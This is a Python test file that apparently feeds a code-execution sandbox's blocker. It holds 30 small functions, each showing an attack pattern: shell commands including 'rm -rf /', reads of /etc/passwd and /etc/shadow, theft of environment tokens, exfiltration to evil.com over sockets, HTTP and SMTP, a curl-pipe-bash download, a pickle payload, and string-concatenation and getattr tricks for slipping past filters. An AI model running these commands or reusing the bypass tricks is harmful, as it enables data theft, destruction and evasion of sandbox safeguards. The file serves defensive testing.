import os
import subprocess
import socket
import base64
import pickle
import shutil
import tempfile
import http.server
import webbrowser
import smtplib
import sqlite3
import ctypes
import requests
import telnetlib
import pymongo
import mysql.connector
from pathlib import Path

def attack_1_system_command():
    os.system("whoami")

def attack_2_subprocess():
    subprocess.run(["cat", "/etc/passwd"], capture_output=True)

def attack_3_popen():
    output = os.popen("cat /etc/shadow").read()

def attack_4_dunder_import():
    __import__("os").system("id")

def attack_5_exec():
    exec("import os\nos.system('rm -rf /')")

def attack_6_eval():
    eval("__import__('os').system('id')")

def attack_7_file_read():
    with open("/etc/passwd") as f:
        data = f.read()

def attack_8_environ():
    secrets = os.environ

def attack_9_getenv():
    home = os.getenv("HOME")
    token = os.getenv("API_TOKEN")

def attack_10_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.com", 4444))

def attack_11_requests():
    requests.get("http://evil.com/exfil?data=" + base64.b64encode(b"secrets"))

def attack_12_base64():
    decoded = base64.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgnd2hvYW1pJyk=")
    exec(decoded)

def attack_13_builtins():
    bi = __builtins__
    bi["__import__"]("os").system("id")

def attack_14_getattr_bypass():
    getattr(__builtins__, "__import__")("os").system("id")

def attack_15_globals_bypass():
    g = globals()
    g["__builtins__"]["__import__"]("os").system("id")

def attack_16_pickle():
    payload = pickle.loads(b"\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x8c\x06system\x93\x8c\x06whoami\x85R.")

def attack_17_ctypes():
    libc = ctypes.CDLL("libc.so.6")
    libc.system(b"whoami")

def attack_18_shutil():
    shutil.rmtree("/tmp/important_data")

def attack_19_pathlib():
    content = Path("/etc/shadow").read_text()

def attack_20_sqlite3():
    conn = sqlite3.connect("/var/data/sensitive.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users")

def attack_21_mysql():
    conn = mysql.connector.connect(host="internal-db", user="root", password="admin")

def attack_22_pymongo():
    client = pymongo.MongoClient("mongodb://internal:27017/")

def attack_23_smtplib():
    server = smtplib.SMTP("smtp.evil.com", 587)
    server.sendmail("victim@corp.com", "attacker@evil.com", "stolen data")

def attack_24_telnetlib():
    tn = telnetlib.Telnet("evil.com", 23)

def attack_25_webbrowser():
    webbrowser.open("http://evil.com/track?cookie=" + "stolen_session_token")

def attack_26_http_server():
    http.server.HTTPServer(("0.0.0.0", 8080), http.server.SimpleHTTPRequestHandler)

def attack_27_tempfile():
    tmp = tempfile.mkdtemp()
    with open(tmp + "/payload.sh", "w") as f:
        f.write("#!/bin/bash\ncurl http://evil.com/shell.sh | bash")
    os.system("chmod +x " + tmp + "/payload.sh")

def attack_28_string_concat_bypass():
    cmd = "who" + "ami"
    os.system(cmd)

def attack_29_getattr_concat_bypass():
    imp = getattr(__builtins__, "__imp" + "ort__")
    imp("os").system("id")

def attack_30_open_concat_bypass():
    o = "op" + "en"
    f = globals()["__buil" + "tins__"].__dict__[o]("/etc/passwd")
    data = f.read()

if __name__ == "__main__":
    print("This file contains 30 attack patterns for security testing.")
    print("Each function demonstrates a different attack vector.")
    print("This file should be BLOCKED by the code execution sandbox.")
